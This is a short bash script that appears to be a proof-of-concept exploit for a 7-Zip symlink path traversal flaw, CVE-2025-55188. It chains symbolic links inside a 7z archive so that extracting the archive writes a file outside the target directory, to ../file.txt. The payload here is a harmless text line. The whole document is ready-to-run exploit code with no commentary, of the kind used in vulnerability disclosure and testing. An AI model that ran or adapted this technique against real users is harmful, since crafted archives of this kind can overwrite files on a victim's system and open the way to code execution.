#!/bin/bash

#
# Writes to ../file.txt on extraction.
#
# Works on Linux only.
#

olddir="$(pwd)"

tempdir="$(mktemp -d)"
cd "$tempdir"

mkdir -p a/b
ln -s /a a/b/link
7z a arb_write.7z a/b/link -snl

ln -s a/b/link/../../ link
7z a arb_write.7z link -snl
rm link

mkdir link
echo "This file was written using CVE-2025-55188." > link/file.txt
7z a arb_write.7z link/file.txt

cp arb_write.7z "$olddir"
cd "$olddir"
rm -r "$tempdir"
